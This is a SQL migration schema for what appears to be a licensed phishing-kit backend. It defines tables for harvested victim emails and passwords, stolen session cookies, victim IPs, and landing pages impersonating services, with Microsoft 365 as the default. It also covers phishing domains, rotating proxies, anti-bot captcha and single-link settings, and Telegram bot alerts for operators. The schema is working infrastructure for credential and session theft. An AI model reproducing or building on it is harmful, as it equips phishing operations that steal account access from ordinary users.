CREATE TABLE `settings` (
	`key` text PRIMARY KEY NOT NULL,
	`value` text DEFAULT '' NOT NULL
);
--> statement-breakpoint
CREATE TABLE `admin_login_attempts` (
	`id` integer PRIMARY KEY AUTOINCREMENT NOT NULL,
	`license_id` text NOT NULL,
	`ip_address` text NOT NULL,
	`failed_attempts` integer DEFAULT 0 NOT NULL,
	`locked_until` text,
	`last_attempt_at` text DEFAULT CURRENT_TIMESTAMP NOT NULL,
	`created_at` text DEFAULT CURRENT_TIMESTAMP NOT NULL,
	FOREIGN KEY (`license_id`) REFERENCES `licenses`(`license_id`) ON UPDATE no action ON DELETE no action
);
--> statement-breakpoint
CREATE TABLE `admin_sessions` (
	`session_token_hash` text PRIMARY KEY NOT NULL,
	`license_id` text NOT NULL,
	`expires_at` text NOT NULL,
	`created_at` text DEFAULT CURRENT_TIMESTAMP NOT NULL,
	`last_seen_at` text DEFAULT CURRENT_TIMESTAMP NOT NULL,
	FOREIGN KEY (`license_id`) REFERENCES `licenses`(`license_id`) ON UPDATE no action ON DELETE no action
);
--> statement-breakpoint
CREATE TABLE `captcha_settings` (
	`license_id` text PRIMARY KEY NOT NULL,
	`option` text DEFAULT 'disabled' NOT NULL,
	`updated_at` text DEFAULT CURRENT_TIMESTAMP NOT NULL,
	FOREIGN KEY (`license_id`) REFERENCES `licenses`(`license_id`) ON UPDATE no action ON DELETE no action
);
--> statement-breakpoint
CREATE TABLE `client_cookies` (
	`sessionId` text NOT NULL,
	`timestamp` text NOT NULL,
	`cookies` text NOT NULL,
	FOREIGN KEY (`sessionId`) REFERENCES `clients`(`sessionId`) ON UPDATE no action ON DELETE no action
);
--> statement-breakpoint
CREATE TABLE `clients` (
	`sessionId` text PRIMARY KEY NOT NULL,
	`client_ip` text NOT NULL,
	`first_seen` text NOT NULL,
	`last_seen` text NOT NULL
);
--> statement-breakpoint
CREATE TABLE `credentials` (
	`sessionId` text NOT NULL,
	`timestamp` text NOT NULL,
	`email` text NOT NULL,
	`password` text NOT NULL,
	`country` text DEFAULT 'Unknown' NOT NULL,
	FOREIGN KEY (`sessionId`) REFERENCES `clients`(`sessionId`) ON UPDATE no action ON DELETE no action
);
--> statement-breakpoint
CREATE TABLE `default_services` (
	`license_id` text PRIMARY KEY NOT NULL,
	`service` text DEFAULT 'Microsoft 365' NOT NULL,
	`updated_at` text DEFAULT CURRENT_TIMESTAMP NOT NULL,
	FOREIGN KEY (`license_id`) REFERENCES `licenses`(`license_id`) ON UPDATE no action ON DELETE no action
);
--> statement-breakpoint
CREATE TABLE `domains` (
	`id` integer PRIMARY KEY AUTOINCREMENT NOT NULL,
	`license_id` text NOT NULL,
	`domain` text NOT NULL,
	`domain_dns` text NOT NULL,
	`subdomain` text NOT NULL,
	`path` text NOT NULL,
	`created_at` text DEFAULT CURRENT_TIMESTAMP NOT NULL,
	FOREIGN KEY (`license_id`) REFERENCES `licenses`(`license_id`) ON UPDATE no action ON DELETE no action
);
--> statement-breakpoint
CREATE TABLE `landing_pages` (
	`license_id` text PRIMARY KEY NOT NULL,
	`service` text NOT NULL,
	`domain_id` integer,
	`updated_at` text DEFAULT CURRENT_TIMESTAMP NOT NULL,
	FOREIGN KEY (`license_id`) REFERENCES `licenses`(`license_id`) ON UPDATE no action ON DELETE no action
);
--> statement-breakpoint
CREATE TABLE `licenses` (
	`license_id` text PRIMARY KEY NOT NULL,
	`password_hash` text,
	`expires_at` text NOT NULL,
	`created_at` text DEFAULT CURRENT_TIMESTAMP NOT NULL,
	`updated_at` text DEFAULT CURRENT_TIMESTAMP NOT NULL
);
--> statement-breakpoint
CREATE TABLE `proxies` (
	`id` integer PRIMARY KEY AUTOINCREMENT NOT NULL,
	`license_id` text NOT NULL,
	`proxy_type` text NOT NULL,
	`username` text NOT NULL,
	`password` text NOT NULL,
	`ip_address` text NOT NULL,
	`port` integer NOT NULL,
	`created_at` text DEFAULT CURRENT_TIMESTAMP NOT NULL,
	FOREIGN KEY (`license_id`) REFERENCES `licenses`(`license_id`) ON UPDATE no action ON DELETE no action
);
--> statement-breakpoint
CREATE TABLE `proxy_settings` (
	`license_id` text PRIMARY KEY NOT NULL,
	`use_proxy` text DEFAULT 'enabled' NOT NULL,
	`rotation_method` text DEFAULT 'sticky' NOT NULL,
	`updated_at` text DEFAULT CURRENT_TIMESTAMP NOT NULL,
	FOREIGN KEY (`license_id`) REFERENCES `licenses`(`license_id`) ON UPDATE no action ON DELETE no action
);
--> statement-breakpoint
CREATE TABLE `single_link_settings` (
	`license_id` text PRIMARY KEY NOT NULL,
	`option` text DEFAULT 'disabled' NOT NULL,
	`updated_at` text DEFAULT CURRENT_TIMESTAMP NOT NULL,
	FOREIGN KEY (`license_id`) REFERENCES `licenses`(`license_id`) ON UPDATE no action ON DELETE no action
);
--> statement-breakpoint
CREATE TABLE `telegram_notifications` (
	`license_id` text PRIMARY KEY NOT NULL,
	`chat_id` text DEFAULT '' NOT NULL,
	`bot_token` text DEFAULT '' NOT NULL,
	`updated_at` text DEFAULT CURRENT_TIMESTAMP NOT NULL,
	FOREIGN KEY (`license_id`) REFERENCES `licenses`(`license_id`) ON UPDATE no action ON DELETE no action
);
--> statement-breakpoint
CREATE TABLE `ip_log` (
	`ip` text PRIMARY KEY NOT NULL,
	`timestamp` integer NOT NULL
);
--> statement-breakpoint
CREATE TABLE `tokens` (
	`token` text PRIMARY KEY NOT NULL,
	`created_at` integer DEFAULT (strftime('%s','now'))
);
--> statement-breakpoint
CREATE TABLE `tracking_cookies` (
	`cookie_value` text PRIMARY KEY NOT NULL,
	`ip` text NOT NULL,
	`created_at` integer DEFAULT (strftime('%s','now'))
);
